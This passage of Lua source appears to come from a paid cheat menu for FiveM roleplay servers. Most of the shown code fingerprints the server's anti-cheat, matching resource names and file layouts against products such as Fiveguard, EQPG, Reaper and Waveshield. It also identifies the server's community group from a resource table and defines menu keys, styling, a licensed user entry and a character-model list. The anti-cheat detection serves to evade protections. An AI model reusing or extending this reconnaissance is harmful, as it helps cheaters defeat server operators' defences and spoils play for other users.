    ["server/install/AC.lua"] = 1, ["server/install/WP.lua"] = 1, ["server/install/EP.lua"] = 1,
    ["server/data/ignored_events.json"] = 1, ["client/html/build/index.html"] = 2, ["server/install/_installer.js"] = 1,
    ["server/sv_config.lua"] = 2, ["client/html/build/data/scare.gif"] = 1, ["yes"] = 2, ["gta5"] = 1,
}
local ruxoFiles = {
    ["code/nui/ui.html"] = 2, ["code/entityiter.lua"] = 2, ["config/shared_config.lua"] = 2,
    ["table_config.lua"] = 1, ["client/client.lua"] = 1, ["code/randomcode.lua"] = 1,
    ["code/installer.lua"] = 1, ["client/shared.lua"] = 1, ["config/server_config.lua"] = 1,
    ["server/server.lua"] = 1, ["code/nui/ui.js"] = 1, ["code/nui/ui.css"] = 1,
}
local cyberFiles = {
    ["client-obfuscated.lua"] = 1, ["menu-obfuscated.lua"] = 1, ["init.lua"] = 4,
    ["server-obfuscated.lua"] = 1, ["bans.json"] = 2, ["install.js"] = 2,
    ["announcements.json"] = 2, ["sv_editme.lua"] = 1, ["sh_editme.lua"] = 1,
    ["index-acae63f2.css"] = 1, ["en.ui.json"] = 1, ["hashes.json"] = 1,
    ["inportant_accepted.json"] = 1, ["index.html"] = 2, ["config.lua"] = 1,
}
local reasonFiles = {
    ["configuration.lua"] = 1, ["aimbot.lua"] = 2, ["crasher.lua"] = 2,
    ["devtools.lua"] = 2, ["dump.lua"] = 2, ["event.lua"] = 2,
    ["heartbeat.lua"] = 2, ["menu.lua"] = 2, ["ocr.lua"] = 2,
    ["player.lua"] = 1, ["tokenizer.lua"] = 2, ["trigger.lua"] = 2,
    ["vehicles.lua"] = 1, ["weapons.lua"] = 2, ["bans.json"] = 1,
    ["config.lua"] = 2, ["webhooks.lua"] = 2, ["commands.lua"] = 1,
    ["entities.lua"] = 1, ["explosions.lua"] = 1, ["particles.lua"] = 1,
    ["sound.lua"] = 1, ["spawn.lua"] = 1, ["start-stop.lua"] = 1,
    ["components.json"] = 1, ["weapons.json"] = 1,
}
local wolfFiles = {
    ["server-event-config.lua"] = 2, ["import.lua"] = 2, ["protected.lua"] = 1,
    ["check.lua"] = 1, ["MySQL.lua"] = 1, ["sv-config.lua"] = 2,
    ["main.js"] = 1, ["client-event-config.lua"] = 1, ["function.lua"] = 1,
    ["shared.lua"] = 2, ["main.lua"] = 5, ["index.html"] = 2,
    ["script.js"] = 1, ["def.js"] = 1,
}
local icarusFiles = {
    ["wrapper.lua"] = 1, ["config.lua"] = 1, ["dist/rpc_loader/RPCLoader.js"] = 1,
    ["yes"] = 2, ["dist/server/App.js"] = 1, ["22"] = 1, ["gta5"] = 1,
}
local cheeseFiles = {
    ["ac_config.lua"] = 2, ["ac_s.lua"] = 1, ["ac_c.lua"] = 1, ["gta5"] = 1,
}
next.DetectAc = function()
    local anticheat = {
        "PL_PROTECT",
        "ThnAC",
        "EQPG",
        "likizao_ac",
        "MQCU"
    }
    if next.detectFiveguard() then
        next.server_info.ac = "Fiveguard"
        return
    end
    if next.detectEqpg() then
        next.server_info.ac = "EQPG"
        return
    end
    for _, ac in ipairs(anticheat) do
        local state = GetResourceState(ac)
        if state == "started" then
            if not next.isResourceEmpty(ac) then
                next.server_info.ac = ac
                return
            end
        end
    end
    local num = GetNumResources()
    for i = 0, num - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName then
            local fx = (GetResourceMetadata(resName, "fx_version", 0) or ""):lower()
            if fx == "adamant" and countSuspiciousFilesExact(resName, reverseFiles) >= 6 then
                next.server_info.ac = "Reverse"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, moonguardFiles) >= 5 then
                next.server_info.ac = "Moonguard"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, electronFiles) >= 6 then
                next.server_info.ac = "Electron"
                return
            end
            if fx == "adamant" and countSuspiciousFilesExact(resName, chocohaxFiles) >= 24 then
                next.server_info.ac = "Chocohax"
                return
            end
            if fx == "adamant" and countSuspiciousFilesExact(resName, eagleFiles) >= 15 then
                next.server_info.ac = "Eagle"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, fireFiles) >= 6 then
                next.server_info.ac = "FireAC"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, finiFiles) >= 6 then
                next.server_info.ac = "FiniAC"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, reaperFiles) >= 8 then
                next.server_info.ac = "Reaper"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, waveshieldFiles) >= 5 then
                next.server_info.ac = "Waveshield"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, wxanticheatFiles) >= 10 then
                next.server_info.ac = "WxAntiCheat"
                return
            end
            if fx == "bodacious" and countSuspiciousFilesExact(resName, pegasusFiles) >= 6 then
                next.server_info.ac = "Pegasus"
                return
            end
            if fx == "adamant" and countSuspiciousFilesExact(resName, ruxoFiles) >= 8 then
                next.server_info.ac = "Ruxo"
                return
            end
            if fx == "adamant" and countSuspiciousFilesExact(resName, cyberFiles) >= 15 then
                next.server_info.ac = "Cyber Secure"
                return
            end
            if fx == "adamant" and countSuspiciousFilesExact(resName, reasonFiles) >= 26 then
                next.server_info.ac = "Reason"
                return
            end
            if fx == "adamant" and countSuspiciousFilesExact(resName, wolfFiles) >= 12 then
                next.server_info.ac = "Wolfshield"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, icarusFiles) >= 6 then
                next.server_info.ac = "Icarus"
                return
            end
            if fx == "cerulean" and countSuspiciousFilesExact(resName, cheeseFiles) >= 4 then
                next.server_info.ac = "Anticheese"
                return
            end
        end
    end
    next.server_info.ac = "Não Detectado"
end
next.ServerInfo = function()
    next.server_info.players = FrameAPI.GetServerInfo()
end
local resourceFG = nil
next.detectFiveguard = function()
    local fgResources = {
        "fiveguard",
        "FiveGuard",
        "Fiveguard",
        "fg"
    }
    
    for _, resName in ipairs(fgResources) do
        local state = GetResourceState(resName)
        if state == "started" or state == "starting" then
            return true, resName
        end
    end
    
    local numResources = GetNumResources()
    for i = 0, numResources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if resourceName then
            local numFiles = GetNumResourceMetadata(resourceName, 'client_script')
            for j = 0, numFiles - 1 do
                local filePath = GetResourceMetadata(resourceName, 'client_script', j)
                if filePath then
                    local lowerPath = string.lower(filePath)
                    if string.find(lowerPath, "obfuscated") or 
                       string.find(lowerPath, "fg%-") or
                       string.find(lowerPath, "fiveguard%-") then
                        local content = LoadResourceFile(resourceName, filePath)
                        if content and string.len(content) > 100 then
                            return true, resourceName
                        end
                    end
                end
            end
            
            local fgPatterns = {
                "fg%-obfuscated",
                "fiveguard%-obfuscated",
                "shared_fg",
                "cl%-fg",
                "sv%-fg"
            }
            
            for _, pattern in ipairs(fgPatterns) do
                local numMeta = GetNumResourceMetadata(resourceName, 'client_script')
                for j = 0, numMeta - 1 do
                    local filePath = GetResourceMetadata(resourceName, 'client_script', j)
                    if filePath and string.find(string.lower(filePath), pattern) then
                        local content = LoadResourceFile(resourceName, filePath)
                        if content and string.len(content) > 100 then
                            return true, resourceName
                        end
                    end
                end
            end
        end
    end
    
    return false, nil
end
next.detectEqpg = function()

    local eqpgResources = {
        "eqpg-pro",
        "eqpg-library",
        "eqpg-record"
    }

    for _, resourceName in ipairs(eqpgResources) do
        local state = GetResourceState(resourceName)
        if state == "started" or state == "starting" then
            resourceFG = resourceName
            return true
        end
    end

    return false
end
    next.DetectGroup = function()
    local resource_group = {
    ["RoupasAlta"] = { city = "Cidade Alta", group = "Lotus Group" },
    ["krakenstore_brasil"] = { city = "Cidade Alta", group = "Lotus Group" },
    ["RoupasAlta"] = { city = "Cidade Alta", group = "Lotus Group" },
    ["Roupas021"] = { city = "021", group = "Lotus Group" },
    ["comando_daily"] = { city = "Comando", group = "Lotus Group" },
    ["Roupas011"] = { city = "011", group = "Lotus Group" },
    ["krakenstore_brasil"] = { city = "Brasil", group = "Lotus Group"},
    ["lotus_daily"] = { city = "Lotus", group = "Lotus Group"},
    ["leste_aim"] = { city = "Leste", group = "Lotus Group"},
    ["nexus_mapas"] = { city = "Nexus RP", group = "Nexus Group" },
    ["nexusrj_mapas"] = { city = "Nexus 2", group = "Nexus Group" },
    ["berlim_roupas"] = { city = "Berlim RP", group = "Nexus Group" },
    ["revoada_me"] = { city = "Revoada RJ", group = "Fusion Group" },
    ["complexo_mapas"] = { city = "Complexo RJ", group = "Fusion Group" },
    ["bahamas_mapas"] = { city = "Bahamas", group = "Fusion Group" },
    ["metropole_carpanel"] = { city = "Metropole", group = "Fusion Group" },
    ["conexao_hud"] = { city = "Conexão", group = "Fusion Group" },
    ["space-module"] = { city = "Space", group = "Space Group" },
    ["aloha"] = { city = "Aloha", group = "Space Group" },
    ["carros_fluxo"] = { city = "Fluxo Rp", group = "Noway Group" },
    ["mapas_valley"] = { city = "Valley Rp", group = "Noway Group" },
    ["carros-nobre"] = { city = "Cidade Nobre", group = "Santa Group" },
    ["roupa-liberty"] = { city = "Liberty99", group = "Santa Group" },
    ["roupas-krown"] = { city = "Krown", group = "Santa Group" },
    ["roupa-real"] = { city = "Real Rp", group = "Santa Group" },
    ["carros-newgrande"] = { city = "Cidade Grande", group = "Santa Group" },
    ["carros-newsanta"] = { city = "Cidade Santa", group = "Santa Group" },
    ["carros-maresia"] = { city = "Maresia RP", group = "Santa Group" },
    ["roupa-maltawp"] = { city = "Malta", group = "Santa Group" },
    ["carros-newkng"] = { city = "Kng Estate", group = "Santa Group" },
    ["santa_radio"] = { city = "Não Detectado", group = "Santa Group" },
    ["sakura-call"] = { city = "Sakura RP", group = "Nenhum" },
    ["dz7-bank"] = { city = "Dz7rp", group = "Nenhum" },
    ["euforia-jobs"] = { city = "Euforia RP", group = "Nenhum" },
    ["cfx-kush"] = { city = "Kush Pvp", group = "Nenhum" },
    ["LisboaWp_MapasLegais"] = { city = "Lisboa", group = "Nenhum" },
    ["atlanta_bank"] = { city = "Atlanta Rj", group = "Nenhum" },
    ["emp_advogado"] = { city = "Brooklyn Rp", group = "Nenhum" },
    ["OasisMapas"] = { city = "Oasis", group = "Nenhum" },
    ["levadacarioca_mapas_v2"] = { city = "Levada Carioca", group = "Nenhum" },
    ["Universe_MapasPrincipais"] = { city = "Universe", group = "Nenhum" },
    ["filadelfia_maps"] = { city = "Filadelfia Rp", group = "Nenhum" },
    ["star_robberies"] = { city = "Starships", group = "Starships" },
    ["neo_death"] = { city = "Neo City", group = "Neo City" },
    ["utopia"] = { city = "Utopia", group = "Europa Group" },
    ["europa_mdt"] = { city = "Europa", group = "Europa Group" },
    ["altoastral-mdt"] = { city = "Alto Astral", group = "Alto Astral" },
    ["hunters_module"] = {city = "Hunters Rp", group = "Hunters Group"},
    ["dallas"] = { city = "Dallas", group = "Nenhum" },
    ["BRISA_viaturas"] = { city = "Brisando RJ", group = "Nenhum" },
    ["hype_nothing"] = { city = "Connect Hype", group = "Nenhum" },
    ["LapaRJ_Mapas"] = { city = "Lapa Rp", group = "Lapa Group" },
    ["neon-payment"] = { city = "Neon Rp", group = "Neon Rp" },
    ["vMenu"] = { city = "Serve Testing", group = "Nenhum" },
    ["abcd_roupas"] = { city = "Abcd Rp", group = "Abcd Group" },
    ["goias_shop"] = { city = "Goias Rp", group = "Nenhum" },
    ["liberdade_tutorial"] = { city = "Liberdade RJ", group = "Nenhum" },
    ["liberdade_motos"] = { city = "Liberdade RP", group = "Nenhum" },
    ["oceania_favelas"] = { city = "Oceania", group = "Oceania Group" },
    ["fardasguarujarp_ruta"] = { city = "Guaruja Sp", group = "Nenhum" },
    ["brnx_advocacy"] = { city = "Brazuca", group = "Nenhum" },
    ["real-payment"] = { city = "Real RP", group = "Nenhum" },
    ["centralsp-dpm"] = { city = "Central SP", group = "Nenhum" },
    ["central_peds"] = { city = "Central Rp", group = "Central Group" },
    ["praca_helipa"] = { city = "Helipa Rp", group = "Nenhum" },
    ["fivez_hud"] = { city = "FiveZ", group = "Nenhum" },
    ["001_cdanjosuniformes"] = { city = "Cidade dos Anjos", group = "Nenhum" },
    ["sampa_staff"] = { city = "Sampa RP", group = "Nenhum" },
    ["PV_BOOSTER_1"] = { city = "Texas RP", group = "Nenhum" },
    ["paraisopolis_carros"] = { city = "Paraisopolis SP", group = "Nenhum" },
    ["thud_management"] = { city = "ThugLife", group = "Nenhum" },
    ["AlfaValley_vinewood"] = { city = "Alfa Valley", group = "Evo Group" },
    ["visivelstudio_conexaorp_letreiro"] = { city = "Conexão RP", group = "Nenhum" },
    ["atl_shoes"] = { city = "Atlantis", group = "Nenhum" },
    ["crush-x1"] = {city = "Crush", group = "Nenhum"},
    ["recompensainicial"] = {city = "Oceania Rp", group = "Nenhum"},
    ["america"] = {city = "America Rp", group = "Nenhum"},
    ["vrp_fire"] = {city = "Fire Evolution", group = "Nenhum"},
    ["wolf-spawn"] = {city = "Wolf Side", group = "Nenhum"},
    ["praca_nova_rj"] = {city = "Nova Rj", group = "Nenhum"},
    ["bellacup"] = {city = "Cidade Bella", group = "Nenhum" },
 }
        for resource, data in pairs(resource_group) do
            if GetResourceState(resource) == "started" then
                next.server_info.group = data.group
                next.server_info.city = data.city
                if type(data.extra) == "table" then
                    next.server_info.groupExtra = table.concat(data.extra, ", ")
                else
                    next.server_info.groupExtra = data.extra
                end
                return
            end
        end
        next.server_info.group = "Não Achado"
        next.server_info.city = "Não Achado"
        next.server_info.groupExtra = "Nenhuma info"
    end
    next.DetectGroup()
    next.DetectAc()
    next.ServerInfo()
    group = next.server_info.group
    anticheat = next.server_info.ac
    city = next.server_info.city
    players = next.server_info.players
    next.welcome_screen = true
    next.render = false
    next.active = false
    next.welcome_screen = false
    myAPI = {}
    myAPI.Keys = {
        ["0"] = 0x30,
        ["1"] = 0x31,
        ["2"] = 0x32,
        ["3"] = 0x33,
        ["4"] = 0x34,
        ["5"] = 0x35,
        ["6"] = 0x36,
        ["7"] = 0x37,
        ["8"] = 0x38,
        ["9"] = 0x39,
        ["A"] = 0x41,
        ["B"] = 0x42,
        ["C"] = 0x43,
        ["D"] = 0x44,
        ["E"] = 0x45,
        ["F"] = 0x46,
        ["G"] = 0x47,
        ["H"] = 0x48,
        ["I"] = 0x49,
        ["J"] = 0x4A,
        ["K"] = 0x4B,
        ["L"] = 0x4C,
        ["M"] = 0x4D,
        ["N"] = 0x4E,
        ["O"] = 0x4F,
        ["P"] = 0x50,
        ["Q"] = 0x51,
        ["R"] = 0x52,
        ["S"] = 0x53,
        ["T"] = 0x54,
        ["U"] = 0x55,
        ["V"] = 0x56,
        ["W"] = 0x57,
        ["X"] = 0x58,
        ["Y"] = 0x59,
        ["Z"] = 0x5A,
        [" "] = 0x20,
        ["_"] = 0xBD,
        ["F1"] = 0x70,
        ["F2"] = 0x71,
        ["F3"] = 0x72,
        ["F4"] = 0x73,
        ["F5"] = 0x74,
        ["F6"] = 0x75,
        ["F7"] = 0x76,
        ["F8"] = 0x77,
        ["F9"] = 0x78,
        ["F10"] = 0x79,
        ["F11"] = 0x7A,
        ["F12"] = 0x7B,
        ["ESC"] = 0x1B,
        ["ENTER"] = 0x0D,
        ["TAB"] = 0x09,
        ["SHIFT"] = 0x10,
        ["CTRL"] = 0x11,
        ["ALT"] = 0x12,
        ["BACKSPACE"] = 0x08,
        ["INSERT"] = 0x2D,
        ["DELETE"] = 0x2E,
        ["HOME"] = 0x24,
        ["END"] = 0x23,
        ["PAGEUP"] = 0x21,
        ["PAGEDOWN"] = 0x22,
        ["LEFT"] = 0x25,
        ["UP"] = 0x26,
        ["RIGHT"] = 0x27,
        ["DOWN"] = 0x28,
        ["NUMPAD0"] = 0x60,
        ["NUMPAD1"] = 0x61,
        ["NUMPAD2"] = 0x62,
        ["NUMPAD3"] = 0x63,
        ["NUMPAD4"] = 0x64,
        ["NUMPAD5"] = 0x65,
        ["NUMPAD6"] = 0x66,
        ["NUMPAD7"] = 0x67,
        ["NUMPAD8"] = 0x68,
        ["NUMPAD9"] = 0x69,
        ["NUMPAD_ADD"] = 0x6B,
        ["NUMPAD_SUBTRACT"] = 0x6D,
        ["NUMPAD_MULTIPLY"] = 0x6A,
        ["NUMPAD_DIVIDE"] = 0x6F,
        ["NUMPAD_DECIMAL"] = 0x6E,
        ["CAPSLOCK"] = 0x14,
        ["NUMLOCK"] = 0x90,
        ["SCROLLLOCK"] = 0x91,
        ["PRINTSCREEN"] = 0x2C,
        ["MBUTTON"] = 0x04,
        ["LBUTTON"] = 0x01,
        ["RBUTTON"] = 0x02,
        ["PAUSE"] = 0x13,
    }
    myAPI.keysBind = {
        ["0"] = 0x30,
        ["1"] = 0x31,
        ["2"] = 0x32,
        ["3"] = 0x33,
        ["4"] = 0x34,
        ["5"] = 0x35,
        ["6"] = 0x36,
        ["7"] = 0x37,
        ["8"] = 0x38,
        ["9"] = 0x39,
        ["A"] = 0x41,
        ["B"] = 0x42,
        ["C"] = 0x43,
        ["D"] = 0x44,
        ["E"] = 0x45,
        ["F"] = 0x46,
        ["G"] = 0x47,
        ["H"] = 0x48,
        ["I"] = 0x49,
        ["J"] = 0x4A,
        ["K"] = 0x4B,
        ["L"] = 0x4C,
        ["M"] = 0x4D,
        ["N"] = 0x4E,
        ["O"] = 0x4F,
        ["P"] = 0x50,
        ["Q"] = 0x51,
        ["R"] = 0x52,
        ["S"] = 0x53,
        ["T"] = 0x54,
        ["U"] = 0x55,
        ["V"] = 0x56,
        ["W"] = 0x57,
        ["X"] = 0x58,
        ["Y"] = 0x59,
        ["Z"] = 0x5A,
        [" "] = 0x20,
        ["_"] = 0xBD,
        ["F1"] = 0x70,
        ["F2"] = 0x71,
        ["F3"] = 0x72,
        ["F4"] = 0x73,
        ["F5"] = 0x74,
        ["F6"] = 0x75,
        ["F7"] = 0x76,
        ["F8"] = 0x77,
        ["F9"] = 0x78,
        ["F10"] = 0x79,
        ["F11"] = 0x7A,
        ["F12"] = 0x7B,
        ["TAB"] = 0x09,
        ["SHIFT"] = 0x10,
        ["CTRL"] = 0x11,
        ["ALT"] = 0x12,
        ["INSERT"] = 0x2D,
        ["DELETE"] = 0x2E,
        ["HOME"] = 0x24,
        ["END"] = 0x23,
        ["PAGEUP"] = 0x21,
        ["PAGEDOWN"] = 0x22,
        ["LEFT"] = 0x25,
        ["UP"] = 0x26,
        ["RIGHT"] = 0x27,
        ["DOWN"] = 0x28,
        ["NUMPAD0"] = 0x60,
        ["NUMPAD1"] = 0x61,
        ["NUMPAD2"] = 0x62,
        ["NUMPAD3"] = 0x63,
        ["NUMPAD4"] = 0x64,
        ["NUMPAD5"] = 0x65,
        ["NUMPAD6"] = 0x66,
        ["NUMPAD7"] = 0x67,
        ["NUMPAD8"] = 0x68,
        ["NUMPAD9"] = 0x69,
        ["NUMPAD_ADD"] = 0x6B,
        ["NUMPAD_SUBTRACT"] = 0x6D,
        ["NUMPAD_MULTIPLY"] = 0x6A,
        ["NUMPAD_DIVIDE"] = 0x6F,
        ["NUMPAD_DECIMAL"] = 0x6E,
        ["CAPSLOCK"] = 0x14,
        ["NUMLOCK"] = 0x90,
        ["SCROLLLOCK"] = 0x91,
        ["PRINTSCREEN"] = 0x2C,
        ["MBUTTON"] = 0x04,
        ["PAUSE"] = 0x13,
    }
    myAPI.keysTextBox = {
        ["0"] = 0x30,
        ["1"] = 0x31,
        ["2"] = 0x32,
        ["3"] = 0x33,
        ["4"] = 0x34,
        ["5"] = 0x35,
        ["6"] = 0x36,
        ["7"] = 0x37,
        ["8"] = 0x38,
        ["9"] = 0x39,
        ["a"] = 0x41,
        ["b"] = 0x42,
        ["c"] = 0x43,
        ["d"] = 0x44,
        ["e"] = 0x45,
        ["f"] = 0x46,
        ["g"] = 0x47,
        ["h"] = 0x48,
        ["i"] = 0x49,
        ["j"] = 0x4A,
        ["k"] = 0x4B,
        ["l"] = 0x4C,
        ["m"] = 0x4D,
        ["n"] = 0x4E,
        ["o"] = 0x4F,
        ["p"] = 0x50,
        ["q"] = 0x51,
        ["r"] = 0x52,
        ["s"] = 0x53,
        ["t"] = 0x54,
        ["u"] = 0x55,
        ["v"] = 0x56,
        ["w"] = 0x57,
        ["x"] = 0x58,
        ["y"] = 0x59,
        ["z"] = 0x5A,
        [" "] = 0x20,
        ["_"] = 0xBD,
    }
    --FrameAPI.Fonts.ImportFontFromUrl('barlowSemiBold', 15.0, 'https://github.com/guilherme165gg/12312312312312/raw/refs/heads/main/barlow-semibold.ttf');
    --FrameAPI.Fonts.ImportFontFromUrl('iconfonts', 15.0, 'https://github.com/guilherme165gg/12312312312312/raw/refs/heads/main/icon_fonts.ttf');
    sW, sH = GetActiveScreenResolution()
    local my =
    {
        mainVars =
        {
            key = next.bind or myAPI.Keys["1"],
            draw = false,
            startupBinding = {active = true, label = "...", control = nil},
            breakTh = false,
            tab = 'self',
            iconTab = 'self_icon',
            curTitle = 'Main',
            curtabName = 'Jogador',
            curSubtab = 'Name',
        },
        screen = {w = sW, h = sH},
        userVars =
        {
            username = 'drakelczin011',
            expire = 'Lifetime',
        },
        brand =
        {
            aspectLogoUrl = "https://comforting-caramel-a85e5d.netlify.app/logo.png",
            discord =
            {
                name = "Discord Name",
                role = "Membro",
                avatarUrl = "",
            },
        },
        sizes =
        {
            mainBackground = {760, 535},
            subtabBackground = {202, 535},
            elementsBackground = {558, 535},
            logo = {40, 48}
        },
        pos =
        {
            mainBackground = {x = 0.0, y = 0.0},
            subtabBackground = {x = 0.0, y = 0.0},
            elementsBackground = {x = 0.0, y = 0.0},
            separatorElements = {x = 0.0, y = 0.0},
        },
        colors =
        {
            main = {255, 0, 0, 255},
            menu =
            {
                bg = {17, 17, 21, 255},
                bgSubtab = {255, 255, 255, 255*0.03},
                bgOutlineSubtab = {255, 255, 255, 255*0.03},
                bgElements = {255, 255, 255, 255*0.03},
            },
            userinfo =
            {
                bg = {36, 36, 40, 255},
                nameColor = {221, 221, 221, 255},
                expireColor = {78, 80, 88, 255}
            },
            drag =
            {
                bg = {17, 17, 21, 255*0.9},
                arrow = {r = 129, g = 131, b = 140, a = 255},
            },
            tab =
            {
                ativa = {255, 255, 255, 255},
                inativa = {78, 80, 88, 255},
                hover = {255, 255, 255, 255*0.1}
            },
            subtab =
            {
                title = {129, 131, 140, 255},
                element = {255, 255, 255, 255*0.04},
                elementStroke = {255, 255, 255, 255*0.02},
                icon =
                {
                    inativo = {78, 80, 88, 255},
                    ativo = {221, 221, 221, 255}
                }
            },
            adminList =
            {
                titleBg = {17, 17, 21, 255},
                titleText = {221, 221, 221, 255},
                bg = {17, 17, 21, 255*0.8},
                location = {221, 221, 221, math.floor(255*0.5)}
            },
            searchbar =
            {
                bg = {255, 255, 255, math.floor(255*0.04)},
                bgStroke = {255, 255, 255, math.floor(255*0.02)},
                icon = {78, 80, 88, 255},
            },
            notify =
            {
                bg = {17, 17, 21, 255*0.88},
                title = {221, 221, 221, 255},
                text = {78, 80, 88, 255}
            },
            elements =
            {
                separator = {217, 217, 217, 255*0.08},
                groupbox =
                {
                    title = {35, 35, 38, 255},
                    titleStroke = {255, 255, 255, 255*0.08},
                    titleIcon = {129, 131, 140, 255*0.8},
                    titleText = {129, 131, 140, 255},
                },
                bind =
                {
                    keyboard = {129, 131, 140, math.floor(255*0.4)},
                    bindbg = {36*0.82, 36*0.82, 40*0.82, 255},
                    text = {129, 131, 140, 255},
                    intbg = {255, 255, 255, 255*0.04},
                    bgStroke = {255, 255, 255, 255*0.02},
                },
                button =
                {
                    bg = {255, 255, 255, 255*0.04},
                    bgstroke = {255, 255, 255, 255*0.02},
                    textinativo = {165, 167, 176, 255},
                },
                checkbox =
                {
                    bg = {255, 255, 255, 255*0.07},
                    bgativo = {255, 255, 255, 255*0.14},
                    bgStroke = {255, 255, 255, 255*0.02},
                    icon = {255, 255, 255, 255},
                },
                comboBox =
                {
                    strokeBg = {255, 255, 255, 255*0.08},
                    interiorText = {129, 131, 140, math.floor(255*0.7)},
                    bg = {255, 255, 255, 255*0.05},
                    bgStroke = {255, 255, 255, 255*0.02},
                },
                slider =
                {
                    bg = {217, 217, 217, 255*0.04},
                    bgValue = {255, 255, 255, 255*0.04},
                    textValue = {129, 131, 140, math.floor(255*0.6)},
                },
                colorpicker =
                {
                    bg = {255, 255, 255, 255*0.04},
                    bgStroke = {255, 255, 255, 255*0.02},
                    textBg = {129, 131, 140, math.floor(255*0.8)},
                    bgmain = {36, 36, 40, 255},
                    textbox = {255, 255, 255, 255*0.04},
                    txtboxText = {129, 131, 140, math.floor(255*0.8)},
                    textboxStroke = {255, 255, 255, 255*0.04},
                    bars = {255, 255, 255, 255}
                },
            },
        },
        images =
        {
            ["cursor"] = {url = "https://stellar-blini-c0db8a.netlify.app/cursor.png", w = 24, h = 24},
        },
        general = {
            ip = GetCurrentServerEndpoint(),
            name = "none",
            group,
            groupName = "none",
            anticheat,
            anticheatName = "none",
            resource = "none",
        },
        vars =
        {
            animVels = {main = 0.06, default = 0.12},
            dragPos = {x = 0.0, y = 0.0},
            screen = {w = 1920, h = 1080},
            playersVars =
            {
                list = {},
                distanceMax = 300.0,
            },
            vehicleVars =
            {
                list = {},
                distanceMax = 300.0,
            },
            tablePeds =
            {
                { name = "Slender Man",                            hash = "SlenderMan" },
                { name = "Chucky",                             hash = "Chucky" },
                { name = "Batman",                            hash = "Batman" },
                { name = "Flash",                        hash = "Flash" },
                { name = "Anao Bilu",                    hash = "AnaoBilu" },
                { name = "Anao Arnold",                    hash = "AnaoArnold" },
                { name = "Anao Fabiano",                    hash = "AnaoFabiano" },
                { name = "Anão CJ",                    hash = "AnaoCJ" },
                { name = "Hulk",                    hash = "Hulk" },
                { name = "Thanos",                    hash = "Thanos" },
                { name = "Homem De Ferro",                    hash = "ironman" },
                { name = "Ronald Mc Donalds",                    hash = "Ronald" },
                { name = "Mickey",                    hash = "Mickey" },
                { name = "Hulk 1",                    hash = "MaestroHulk_MarvelsAvengers_V1" },
                { name = "Hulk Policial",                    hash = "hulkpolicial" },
                { name = "Hulk 2",                    hash = "MaestroHulk_MarvelsAvengers_V2" },
                { name = "Anão Leo Gigante",                    hash = "anao_leogigante" },
                { name = "Pantera Cor De Rosa",                    hash = "pinkpanther" },
                { name = "Ompalumpa",                    hash = "anao_ompa" },
                { name = "Poucoyo",                    hash = "Poucoyo" },
                { name = "Grimace",                    hash = "Grimace" },
                { name = "Neymar",                    hash = "Neymar" },
                { name = "Jett",                    hash = "Jett" },
                { name = "Boomer",                    hash = "boomer" },
                { name = "Deadpool",                    hash = "deadpool" },
                { name = "Flash",                    hash = "flash" },
                { name = "papainoel",                    hash = "papainoel" },
                { name = "Alerquina",                    hash = "Alerquina" },
                { name = "Rajah",                    hash = "Rajah" },
                { name = "werewolf",                    hash = "werewolf" },
                { name = "norrismacaco",                    hash = "norrismacaco" },
                { name = "Tigor",                    hash = "Tigor" },
                { name = "canecorso",                    hash = "canecorso" },
                { name = "doberman",                    hash = "doberman" },
                { name = "ft-fbulldog",                    hash = "ft-fbulldog" },
                { name = "ft_greyhound",                    hash = "ft_greyhound" },
                { name = "GuardaBritanica",                    hash = "GuardaBritanica" },
                { name = "Sonic",                    hash = "Sonic" },
                { name = "Kelly",                    hash = "Kelly" },
                { name = "kiko",                    hash = "kiko" },
                { name = "splinter",                    hash = "splinter" },
                { name = "hunter",                    hash = "hunter" },
                { name = "spiderfat",                    hash = "spiderfat" },
                { name = "Robert-Boy",                    hash = "Robert-Boy" },
                { name = "hulk",                    hash = "hulk" },
                { name = "capitao",                    hash = "capitao" },
                { name = "Bolsonarinho",                    hash = "Bolsonarinho" },
                { name = "batman",                    hash = "batman" },
                { name = "AnaoMatue",                    hash = "AnaoMatue" },
                { name = "AnaoCJ",                    hash = "AnaoCJ" },
                { name = "chucky",                    hash = "chucky" },
                { name = "SlenderMan",                    hash = "SlenderMan" },
                { name = "Sonic",                    hash = "Sonic" },
                { name = "ironman",                    hash = "ironman" },
                { name = "thanos",                    hash = "thanos" },
                { name = "NeymarJR",                    hash = "NeymarJR" },
                { name = "SpidermanClassic",                    hash = "SpidermanClassic" },
                { name = "Boomer2",                    hash = "boomer2" },
                { name = "Boomette",                    hash = "boomette" },
                { name = "Charger",                    hash = "charger" },
                { name = "Hunter",                    hash = "hunter" },
                { name = "Jockey",                    hash = "jockey" },
                { name = "Smoker",                    hash = "smoker" },
                { name = "Witch",                    hash = "witch" },
                { name = "Spiderman",                    hash = "spiderman" },
                { name = "Naruto",                    hash = "naruto" },
                { name = "CR7",                    hash = "CR7" },
                { name = "Travis Scott",                    hash = "TravisScott" },
                { name = "MC POZE",                    hash = "MC_POZE" },
                { name = "anao_feio",                    hash = "anao_feio" },
                { name = "HeroiTomatao",                    hash = "HeroiTomatao" },
                { name = "CJ_JUNIOR",                    hash = "CJ_JUNIOR" },
                { name = "ANGEL_Franklin",                    hash = "ANGEL_Franklin" },
                { name = "Samurai",                    hash = "Samurai" },
                { name = "DragaoLCFR",                    hash = "DragaoLCFR" },
                { name = "AlienLCFR",                    hash = "AlienLCFR" },
                { name = "DogMilitary",                    hash = "DogMilitary" },
                { name = "a_c_poodle_2",                    hash = "a_c_poodle_2" },
                { name = "sphynx",                    hash = "sphynx" },
                { name = "A_C_Husky_2",                    hash = "A_C_Husky_2" },
                { name = "A_C_shepherd_2",                    hash = "A_C_shepherd_2" },
                { name = "a_c_westy_2",                    hash = "a_c_westy_2" },
                { name = "A_C_Retriever_2",                    hash = "A_C_Retriever_2" },
                { name = "two_face",                    hash = "two_face" },
                { name = "zombie_argonix",                    hash = "zombie_argonix" },
                { name = "dog_jully",                    hash = "dog_jully" },
                { name = "Special3",                    hash = "Special3" },
                { name = "trex",                    hash = "trex" },
                { name = "spiked",                    hash = "spiked" },
